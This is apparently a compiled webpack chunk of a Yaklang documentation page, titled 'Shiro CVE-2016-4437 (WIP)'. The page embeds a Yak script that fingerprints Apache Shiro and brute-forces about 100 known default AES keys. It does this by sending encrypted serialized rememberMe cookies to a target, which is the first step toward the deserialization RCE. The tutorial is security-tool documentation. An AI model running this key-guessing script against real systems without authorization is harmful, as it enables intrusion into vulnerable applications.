(self.webpackChunkyaklang=self.webpackChunkyaklang||[]).push([[2976],{3905:function(e,n,r){"use strict";r.d(n,{Zo:function(){return p},kt:function(){return m}});var t=r(67294);function a(e,n,r){return n in e?Object.defineProperty(e,n,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[n]=r,e}function o(e,n){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);n&&(t=t.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),r.push.apply(r,t)}return r}function s(e){for(var n=1;n<arguments.length;n++){var r=null!=arguments[n]?arguments[n]:{};n%2?o(Object(r),!0).forEach((function(n){a(e,n,r[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):o(Object(r)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(r,n))}))}return e}function i(e,n){if(null==e)return{};var r,t,a=function(e,n){if(null==e)return{};var r,t,a={},o=Object.keys(e);for(t=0;t<o.length;t++)r=o[t],n.indexOf(r)>=0||(a[r]=e[r]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(t=0;t<o.length;t++)r=o[t],n.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(a[r]=e[r])}return a}var A=t.createContext({}),c=function(e){var n=t.useContext(A),r=n;return e&&(r="function"==typeof e?e(n):s(s({},n),e)),r},p=function(e){var n=c(e.components);return t.createElement(A.Provider,{value:n},e.children)},l={inlineCode:"code",wrapper:function(e){var n=e.children;return t.createElement(t.Fragment,{},n)}},d=t.forwardRef((function(e,n){var r=e.components,a=e.mdxType,o=e.originalType,A=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),d=c(r),m=a,u=d["".concat(A,".").concat(m)]||d[m]||l[m]||o;return r?t.createElement(u,s(s({ref:n},p),{},{components:r})):t.createElement(u,s({ref:n},p))}));function m(e,n){var r=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=r.length,s=new Array(o);s[0]=d;var i={};for(var A in n)hasOwnProperty.call(n,A)&&(i[A]=n[A]);i.originalType=e,i.mdxType="string"==typeof e?e:a,s[1]=i;for(var c=2;c<o;c++)s[c]=r[c];return t.createElement.apply(null,s)}return t.createElement.apply(null,r)}d.displayName="MDXCreateElement"},84307:function(e,n,r){"use strict";r.r(n),r.d(n,{frontMatter:function(){return s},contentTitle:function(){return i},metadata:function(){return A},toc:function(){return c},default:function(){return l}});var t=r(74034),a=r(79973),o=(r(67294),r(3905)),s={sidebar_position:4},i="Shiro CVE-2016-4437\uff08WIP\uff09",A={unversionedId:"best-practice/shiro-case",id:"best-practice/shiro-case",isDocsHomePage:!1,title:"Shiro CVE-2016-4437\uff08WIP\uff09",description:"\u9605\u8bfb\u672c\u6587\u524d\uff0c\u8bf7\u5148\u786e\u4fdd\u5df2\u7ecf\u719f\u6089 ThinkPHP-5.0.25-RCE \u4e2d\u76f8\u5173\u5185\u5bb9",source:"@site/products/best-practice/shiro-case.mdx",sourceDirName:"best-practice",slug:"/best-practice/shiro-case",permalink:"/en/products/best-practice/shiro-case",tags:[],version:"current",sidebarPosition:4,frontMatter:{sidebar_position:4},sidebar:"teamSidebar",previous:{title:"ThinkPHP RCE \u88ab\u52a8\u626b\u63cf\u63d2\u4ef6 [MITM]",permalink:"/en/products/best-practice/thinkphp5-pasiveScan"},next:{title:"\u751f\u6001\u8d21\u732e\u6307\u5357",permalink:"/en/products/best-practice/become-developer"}},c=[{value:"\u539f\u4ee3\u7801",id:"\u539f\u4ee3\u7801",children:[]}],p={toc:c};function l(e){var n=e.components,r=(0,a.Z)(e,["components"]);return(0,o.kt)("wrapper",(0,t.Z)({},p,r,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"shiro-cve-2016-4437\uff08wip\uff09"},"Shiro CVE-2016-4437\uff08WIP\uff09"),(0,o.kt)("p",null,"\u9605\u8bfb\u672c\u6587\u524d\uff0c\u8bf7\u5148\u786e\u4fdd\u5df2\u7ecf\u719f\u6089 ",(0,o.kt)("a",{parentName:"p",href:"/products/best-practice/thinkphp-case"},"ThinkPHP-5.0.25-RCE")," \u4e2d\u76f8\u5173\u5185\u5bb9"),(0,o.kt)("p",null,"\u672c\u7bc7\u4e2d\u5c06\u4f1a\u6d89\u53ca\u5230 Shiro \u8fd9\u7c7b\u6bd4\u8f83\u590d\u6742\u7684\u6f0f\u6d1e\u68c0\u6d4b\uff0c\u6211\u4eec\u5c06\u5b8c\u5168\u901a\u8fc7 ",(0,o.kt)("inlineCode",{parentName:"p"},"Yak")," \u5185\u90e8\u7684\u6a21\u5757\u5b8c\u6210\u8be5\u6a21\u5757"),(0,o.kt)("div",{className:"admonition admonition-caution alert alert--warning"},(0,o.kt)("div",{parentName:"div",className:"admonition-heading"},(0,o.kt)("h5",{parentName:"div"},(0,o.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,o.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"16",height:"16",viewBox:"0 0 16 16"},(0,o.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"}))),"Work In Progress")),(0,o.kt)("div",{parentName:"div",className:"admonition-content"},(0,o.kt)("p",{parentName:"div"},"\u66f4\u8be6\u7ec6\u7684\u7f16\u7801\u6559\u7a0b\u4e0e\u89e3\u8bfb\u6211\u4eec\u5c06\u5728\u540e\u7eed\u8865\u5145"))),(0,o.kt)("h2",{id:"\u539f\u4ee3\u7801"},"\u539f\u4ee3\u7801"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-go"},'log.setLevel("info")\nisHttps = cli.Bool("https")\n\n// \u6784\u5efa shiro \u57fa\u7840\u8bf7\u6c42\nbaseFreq := fuzz.HTTPRequest(`GET / HTTP/1.1\nHost: example.com\nConnection: close\n\n`)[0].FuzzHTTPHeader("Host", "cybertunnel.run:8080")\n\n// \u53d1\u9001\u6570\u636e\u5305\uff0c\u53d6\u4e00\u4e0b\u6307\u7eb9\u7ed3\u679c\nresult = baseFreq.FuzzCookie("rememberMe", "{{rs(10)}}").ExecFirst(\n    httpool.https(isHttps), httpool.redirectTimes(4),\n)[0]\ndie(result.Error)\n\nurl, reqRaw, rspRaw = result.Url, result.RequestRaw, result.ResponseRaw\n\n// \u68c0\u67e5\u6307\u7eb9\nheaders, body := str.SplitHTTPHeadersAndBodyFromPacket(rspRaw)\nif !str.MatchAnyOfSubString(headers, "rememberMe=deleteMe;") {\n    die("no shiro detected")\n}\n\nlog.info("shiro on %v detected", url)\nlog.info("start to check key")\n\n// \u6307\u7eb9\u68c0\u6d4b\u5de5\u7a0b\uff0c\u63a5\u4e0b\u6765\u51c6\u5907\u731c key\nkeys = [\n    "kPH+bIxk5D2deZiIxcaaaA==",\n    "4AvVhmFLUs0KTA3Kprsdag==",\n    "Z3VucwAAAAAAAAAAAAAAAA==",\n    "fCq+/xW488hMTCD+cmJ3aQ==",\n    "0AvVhmFLUs0KTA3Kprsdag==",\n    "1AvVhdsgUs0FSA3SDFAdag==",\n    "1QWLxg+NYmxraMoxAXu/Iw==",\n    "25BsmdYwjnfcWmnhAciDDg==",\n    "2AvVhdsgUs0FSA3SDFAdag==",\n    "3AvVhmFLUs0KTA3Kprsdag==",\n    "3JvYhmBLUs0ETA5Kprsdag==",\n    "r0e3c16IdVkouZgk1TKVMg==",\n    "5aaC5qKm5oqA5pyvAAAAAA==",\n    "5AvVhmFLUs0KTA3Kprsdag==",\n    "6AvVhmFLUs0KTA3Kprsdag==",\n    "6NfXkC7YVCV5DASIrEm1Rg==",\n    "6ZmI6I2j5Y+R5aSn5ZOlAA==",\n    "cmVtZW1iZXJNZQAAAAAAAA==",\n    "7AvVhmFLUs0KTA3Kprsdag==",\n    "8AvVhmFLUs0KTA3Kprsdag==",\n    "8BvVhmFLUs0KTA3Kprsdag==",\n    "9AvVhmFLUs0KTA3Kprsdag==",\n    "OUHYQzxQ/W9e/UjiAGu6rg==",\n    "a3dvbmcAAAAAAAAAAAAAAA==",\n    "aU1pcmFjbGVpTWlyYWNsZQ==",\n    "bWljcm9zAAAAAAAAAAAAAA==",\n    "bWluZS1hc3NldC1rZXk6QQ==",\n    "bXRvbnMAAAAAAAAAAAAAAA==",\n    "ZUdsaGJuSmxibVI2ZHc9PQ==",\n    "wGiHplamyXlVB11UXWol8g==",\n    "U3ByaW5nQmxhZGUAAAAAAA==",\n    "MTIzNDU2Nzg5MGFiY2RlZg==",\n    "L7RioUULEFhRyxM7a2R/Yg==",\n    "a2VlcE9uR29pbmdBbmRGaQ==",\n    "WcfHGU25gNnTxTlmJMeSpw==",\n    "OY//C4rhfwNxCQAQCrQQ1Q==",\n    "5J7bIJIV0LQSN3c9LPitBQ==",\n    "f/SY5TIve5WWzT4aQlABJA==",\n    "bya2HkYo57u6fWh5theAWw==",\n    "WuB+y2gcHRnY2Lg9+Aqmqg==",\n    "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",\n    "3qDVdLawoIr1xFd6ietnwg==",\n    "ZWvohmPdUsAWT3=KpPqda",\n    "YI1+nBV//m7ELrIyDHm6DQ==",\n    "6Zm+6I2j5Y+R5aS+5ZOlAA==",\n    "2A2V+RFLUs+eTA3Kpr+dag==",\n    "6ZmI6I2j3Y+R1aSn5BOlAA==",\n    "SkZpbmFsQmxhZGUAAAAAAA==",\n    "2cVtiE83c4lIrELJwKGJUw==",\n    "fsHspZw/92PrS3XrPW+vxw==",\n    "XTx6CKLo/SdSgub+OPHSrw==",\n    "sHdIjUN6tzhl8xZMG3ULCQ==",\n    "O4pdf+7e+mZe8NyxMTPJmQ==",\n    "HWrBltGvEZc14h9VpMvZWw==",\n    "rPNqM6uKFCyaL10AK51UkQ==",\n    "Y1JxNSPXVwMkyvES/kJGeQ==",\n    "lT2UvDUmQwewm6mMoiw4Ig==",\n    "MPdCMZ9urzEA50JDlDYYDg==",\n    "xVmmoltfpb8tTceuT5R7Bw==",\n    "c+3hFGPjbgzGdrC+MHgoRQ==",\n    "ClLk69oNcA3m+s0jIMIkpg==",\n    "Bf7MfkNR0axGGptozrebag==",\n    "1tC/xrDYs8ey+sa3emtiYw==",\n    "ZmFsYWRvLnh5ei5zaGlybw==",\n    "cGhyYWNrY3RmREUhfiMkZA==",\n    "IduElDUpDDXE677ZkhhKnQ==",\n    "yeAAo1E8BOeAYfBlm4NG9Q==",\n    "cGljYXMAAAAAAAAAAAAAAA==",\n    "2itfW92XazYRi5ltW0M2yA==",\n    "XgGkgqGqYrix9lI6vxcrRw==",\n    "ertVhmFLUs0KTA3Kprsdag==",\n    "5AvVhmFLUS0ATA4Kprsdag==",\n    "s0KTA3mFLUprK4AvVhsdag==",\n    "hBlzKg78ajaZuTE0VLzDDg==",\n    "9FvVhtFLUs0KnA3Kprsdyg==",\n    "d2ViUmVtZW1iZXJNZUtleQ==",\n    "yNeUgSzL/CfiWw1GALg6Ag==",\n    "NGk/3cQ6F5/UNPRh8LpMIg==",\n    "4BvVhmFLUs0KTA3Kprsdag==",\n    "MzVeSkYyWTI2OFVLZjRzZg==",\n    "CrownKey==a12d/dakdad",\n    "empodDEyMwAAAAAAAAAAAA==",\n    "A7UzJgh1+EWj5oBFi+mSgw==",\n    "YTM0NZomIzI2OTsmIzM0NTueYQ==",\n    "c2hpcm9fYmF0aXMzMgAAAA==",\n    "i45FVt72K2kLgvFrJtoZRw==",\n    "U3BAbW5nQmxhZGUAAAAAAA==",\n    "ZnJlc2h6Y24xMjM0NTY3OA==",\n    "Jt3C93kMR9D5e8QzwfsiMw==",\n    "MTIzNDU2NzgxMjM0NTY3OA==",\n    "vXP33AonIp9bFwGl7aT7rA==",\n    "V2hhdCBUaGUgSGVsbAAAAA==",\n    "Z3h6eWd4enklMjElMjElMjE=",\n    "Q01TX0JGTFlLRVlfMjAxOQ==",\n    "ZAvph3dsQs0FSL3SDFAdag==",\n    "Is9zJ3pzNh2cgTHB4ua3+Q==",\n    "NsZXjXVklWPZwOfkvk6kUA==",\n    "GAevYnznvgNCURavBhCr1w==",\n    "66v1O8keKNV3TTcGPK1wzg==",\n    "SDKOLKn2J1j/2BHjeZwAoQ==",\n]\n\ndata = codec.DecodeHex(`aced0005737200326f72672e6170616368652e736869726f2e7375626a6563742e53696d706c655072696e636970616c436f6c6c656374696f6ea87f5825c6a3084a0300014c000f7265616c6d5072696e636970616c7374000f4c6a6176612f7574696c2f4d61703b78707077010078`)[0]\n\ncookies = make([]string)\nfor _, key = range keys {\n    for _, rs = range [\n        codec.AESCBCEncrypt,\n        codec.AESGCMDecrypt,\n    ] {\n        keyBytes = codec.DecodeBase64(key)[0]\n        res, err := rs(keyBytes, data, nil)\n        if err != nil {\n            println(err)\n            continue\n        }\n        cookieRaw = append(keyBytes, res...)\n        base64dK := codec.EncodeBase64(cookieRaw)\n        cookies = append(cookies, base64dK)\n    }\n}\n\nprintln("start go fuzz rememberMe")\nr, err := baseFreq.FuzzCookie("rememberMe", cookies).Exec(httpool.https(isHttps), httpool.size(3))\ndie(err)\n\nkeyFoundResult = var\nfor result = range r {\n    if result.Error != nil {\n        continue\n    }\n    header, body = str.SplitHTTPHeadersAndBodyFromPacket(result.ResponseRaw)\n    if str.MatchAllOfSubString(header, "rememberMe=deleteMe") {\n        continue\n    }\n    keyFoundResult = result\n    break\n}\n\n// keyFoundResult\nprintln(string(keyFoundResult.RequestRaw))\n')))}l.isMDXComponent=!0}}]);